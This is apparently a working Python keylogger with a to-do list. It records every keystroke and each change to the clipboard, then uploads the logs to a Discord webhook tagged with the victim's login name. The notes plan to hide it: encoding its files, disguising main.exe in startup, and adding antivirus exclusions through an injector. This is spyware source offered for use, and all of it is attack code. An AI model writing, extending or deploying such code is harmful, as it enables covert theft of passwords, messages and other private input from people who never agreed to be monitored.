# To Do

#   encode files in `Source` directory, it can just be base64 that is decoded at runtime or something
#       doing this means that if someone stumbles across the files and tries reading them they wont be able to
#       at least not in plain text

#   Create like a bat file or ps1 file to undo all the stuff the inject.bin does
#       like removing main.exe from startup, restoring ExecutionPolicy settings, removing source folder from
#       user directory, removing cache from exclusions list, and removing the cache folder

#   Log mouse clicks and stuff

#   store inputs in another file that is just each input side by side like plain text yknow

#   rename and change icon of main.exe so it looks less sus if someone were to check startup processes

#   store inputs in another file that is just each input side by side like plain text yknow
#       but try and seperate text based on inputs (if someone clicks, presses enter or tab or stuff like that
#       then they likely arent typing in the same textbox anymore)

from pynput import keyboard
from pathlib import Path
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import hashlib
import pyperclip

max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
clear_after_send = True
clip = ""

def kill_switch():
    file_path = Path.home() / "Source/kill"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if file_path.exists():
        return True

def generate_color(name):
    hashed_name = hashlib.md5(name.encode('utf-8')).hexdigest()
    r = int(hashed_name[0:2], 16)
    g = int(hashed_name[2:4], 16)
    b = int(hashed_name[4:6], 16)
    return "{:02X}{:02X}{:02X}".format(r, g, b)

def check_if_should_send(lines):
    if lines >= max_lines:
        webhook = DiscordWebhook(url=url, username="Keys")
        file_path = Path.home() / "Source/main"
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with file_path.open('r') as file:
            webhook.add_file(file=file.read(), filename="keys.txt")
        try:
            file_path = Path.home() / "Source/dist"
            file_path.parent.mkdir(parents=True, exist_ok=True)
            with file_path.open('r') as file:
                webhook.add_file(file=file.read(), filename="clipboard.txt")
        except:
            pass
        embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=generate_color(os.getlogin()))
        embed.set_timestamp()
        webhook.add_embed(embed)
        if clear_after_send:
            file_path = Path.home() / "Source/main"
            file_path.parent.mkdir(parents=True, exist_ok=True)
            with file_path.open('w') as file:
                file.write("")
            try:
                file_path = Path.home() / "Source/dist"
                file_path.parent.mkdir(parents=True, exist_ok=True)
                with file_path.open('w') as file:
                    file.write("")
            except:
                pass
        webhook.execute()

def ascii_replace(key):
    try:
        if str(key) == "<12>":
            return "numpad 5"
        elif str(key) == "<48>":
            return 0
        elif str(key) == "<49>":
            return 1
        elif str(key) == "<50>":
            return 2
        elif str(key) == "<51>":
            return 3
        elif str(key) == "<52>":
            return 4
        elif str(key) == "<53>":
            return 5
        elif str(key) == "<54>":
            return 6
        elif str(key) == "<55>":
            return 7
        elif str(key) == "<56>":
            return 8
        elif str(key) == "<57>":
            return 9
        elif str(key) == "<106>":
            return "numpad *"
        elif str(key) == "<107>":
            return "numpad +"
        elif str(key) == "<109>":
            return "numpad -"
        elif str(key) == "<111>":
            return "numpad /"
        elif str(key) == "<186>":
            return ";"
        elif str(key) == "<187>":
            return "="
        elif str(key) == "<188>":
            return ","
        elif str(key) == "<189>":
            return "-"
        elif str(key) == "<190>":
            return "."
        elif str(key) == "<191>":
            return "/"
        elif str(key) == "<192>":
            return "`"
        elif str(key) == "<222>":
            return "'"
        else:
            try: 
                key = key.name
            except:
                key = key.char
            
            if '\x01' in key:
                return "a"
            elif '\x02' in key:
                return "b"
            elif '\x03' in key:
                return "c"
            elif '\x04' in key:
                return "d"
            elif '\x05' in key:
                return "e"
            elif '\x06' in key:
                return "f"
            elif '\x07' in key:
                return "g"
            elif '\x08' in key:
                return "h"
            elif '\t' in key:
                return "i"
            elif '\n' in key:
                return "j"
            elif '\x0b' in key:
                return "k"
            elif '\x0c' in key:
                return "l"
            elif '\r' in key:
                return "m"
            elif '\x0e' in key:
                return "n"
            elif '\x0f' in key:
                return "o"
            elif '\x10' in key:
                return "p"
            elif '\x11' in key:
                return "q"
            elif '\x12' in key:
                return "r"
            elif '\x13' in key:
                return "s"
            elif '\x14' in key:
                return "t"
            elif '\x15' in key:
                return "u"
            elif '\x16' in key:
                return "v"
            elif '\x17' in key:
                return "w"
            elif '\x18' in key:
                return "x"
            elif '\x19' in key:
                return "y"
            elif '\x1a' in key:
                return "z"
            elif '\x1b' in key:
                return "["
            elif '\x1c' in key:
                return "\\"
            elif '\x1d' in key:
                return "]"
            else:
                return key
    except:
        return key

def on_press(key):
    key_name = ascii_replace(key)

    log = f" Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}\n"

    file_path = Path.home() / "Source/main"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log)
    else:
        with file_path.open('a') as file:
            file.write(log)

def on_release(key):
    global clip
    key_name = ascii_replace(key)

    log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"

    file_path = Path.home() / "Source/main"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log)
        lines = 0
    else:
        with file_path.open('r+') as file:
            file.write(log)
            lines = len(file.readlines())
    
    try:
        if str(clip) != pyperclip.paste():
            clip = pyperclip.paste()
            log = f"{datetime.now()} :\n{str(clip)}\n\n"

            file_path = Path.home() / "Source/dist"
            file_path.parent.mkdir(parents=True, exist_ok=True)

            if not file_path.exists():
                file_path.write_text(log)
            else:
                with file_path.open('a') as file:
                    file.write(log)
    except:
        pass

    check_if_should_send(lines)

    if kill_switch():
        webhook = DiscordWebhook(url=url, username="Keys")
        embed = DiscordEmbed(title=f"Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
        webhook.add_embed(embed)
        webhook.execute()
        return False

if not kill_switch():
    file_path = Path.home() / "Source/src"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if file_path.exists():
        try:
            with file_path.open('r') as file:
                url = file.readline().replace("\n","").strip()
                max_lines = int(file.readline())
            webhook = DiscordWebhook(url=url, username="Keys")
            embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=generate_color(os.getlogin()))
            webhook.add_embed(embed)
            response = webhook.execute()

            if response.status_code != 401:
                with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
                    l.join()
        except:
            pass